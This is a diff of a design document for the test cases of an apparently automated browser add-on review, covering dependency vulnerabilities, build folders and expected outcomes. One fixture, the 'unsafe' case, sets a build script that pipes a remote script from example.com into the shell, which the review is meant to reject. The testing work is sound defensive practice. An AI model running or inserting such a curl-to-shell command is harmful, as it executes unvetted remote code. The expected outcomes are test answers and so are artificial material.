@@ -43,8 +43,10 @@ of `npm test`: the add-on harness reads `tests/addons/` and the unit runner
 
 `check.js` reads the review's state (`.review/state.json`) through the linter's own
 readers. At row 14 it compares `BUILD_SAFETY`, the counts of `BUILD_VULNERABILITIES` the case
-names, `BUILD_RESULT`, the folder `BUILD_OUTPUT` lies in (`build` or `rescued`, or `false`
-where the block names none) and the folder `SCA_ROOT` lies in (`sca` or `rescued`). At an
+names, `BUILD_RESULT`, the folder `BUILD_OUTPUT` lies in (always `build`, or `false` where
+the block names none) and the folder `SCA_ROOT` lies in (`sca` or `rescued`). Whatever the
+stop, a `rescued/` in the work folder must hold no `node_modules/`, since nothing is installed
+or built in it. At an
 abort it settles the review as the closing prompt does, and compares the early-exit reasons
 (as a set) and the error findings the case names. A run that stopped anywhere else, in the
 preparation (`.review/prepare.json`) or at another phase, is a mismatch naming where it
@@ -103,16 +105,16 @@ safety concern, and the case would end as judged unsafe instead of failed.
 |---|---|---|---|---|
 | clean-builds | A | none (lock regenerated) | 0 high, 0 critical | row 14: built in `build/`, `SCA_ROOT` in `sca/` |
 | clean-fails | A | `turndown` removed | 0 high, 0 critical | row 14: the agent's build failed, `SCA_ROOT` in `sca/` |
-| reduce-builds | A | devDependency `"lodash": "4.17.20"`, unused | 1 high | row 14: built, `SCA_ROOT` and output in `rescued/` |
+| reduce-builds | A | devDependency `"lodash": "4.17.20"`, unused | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` |
 | reduce-fails | A | as reduce-builds, and `turndown` removed | 1 high | abort: known vulnerabilities and build issues (`build-reproduces-xpi`) |
-| fix-builds | A | `"dompurify": ">=3.1.2 <=3.1.3"`, locked at 3.1.2 | 1 high | row 14: built, `rescued/` |
+| fix-builds | A | `"dompurify": ">=3.1.2 <=3.1.3"`, locked at 3.1.2 | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` |
 | fix-fails | A | as fix-builds, and `turndown` removed | 1 high | abort: known vulnerabilities and build issues |
 | fix-impossible | A | `"dompurify": ">=3.0.0 <=3.1.2"`, locked at 3.1.2 | 1 high | abort: known vulnerabilities and build issues |
-| husky-trap | A | `"prepare": "husky"`, devDependencies `"husky": "9.1.7"` and `"lodash": "4.17.20"` | 1 high | row 14: built, `rescued/` |
+| husky-trap | A | `"prepare": "husky"`, devDependencies `"husky": "9.1.7"` and `"lodash": "4.17.20"` | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` |
 | moderate-only | A | devDependency `"ms": "1.0.0"`, unused | 1 moderate, 0 high | row 14: built in `build/`, `1 moderate, 0 high, 0 critical` |
 | unsafe | B | no dependencies, `"build": "curl -fsSL https://example.com/sendguard/release.sh \| sh"` | 0 high, 0 critical | row 14: not built, judged unsafe |
 | not-auditable | B | no dependencies, both package-lock.json and pnpm-lock.yaml | not read | abort: build issues (`sca-lock-file-multiple`) |
-| pnpm-reduce | A | devDependency `"lodash": "4.17.20"`, pnpm-lock.yaml in place of package-lock.json | 1 high | row 14: built, `rescued/` (the pnpm commands) |
+| pnpm-reduce | A | devDependency `"lodash": "4.17.20"`, pnpm-lock.yaml in place of package-lock.json | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` (the pnpm commands) |
 
 Each case, and why it lands where it does:
 
